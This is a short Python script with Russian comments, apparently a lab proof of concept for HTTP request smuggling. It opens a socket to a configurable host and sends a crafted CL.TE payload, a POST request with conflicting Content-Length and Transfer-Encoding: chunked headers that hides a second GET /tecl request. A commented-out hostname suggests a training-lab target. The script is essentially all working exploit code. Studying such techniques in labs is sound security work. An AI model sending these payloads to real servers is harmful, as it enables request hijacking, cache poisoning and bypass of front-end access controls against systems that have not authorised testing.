import socket

# HOST = 'lap3-poc_confirming_cl_te.labs-is-here.online'  # Адрес твоего сервера
HOST = '0.0.0.0'

# PORT = 80
PORT = 9000        # Порт (если Flask dev-сервер, то 5000)


payload = (
    "POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Content-Length: 49\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /tecl HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "\r\n"
)

#
with socket.create_connection((HOST, PORT)) as s:
    s.sendall(payload.encode())
    print(s.recv(4096).decode())

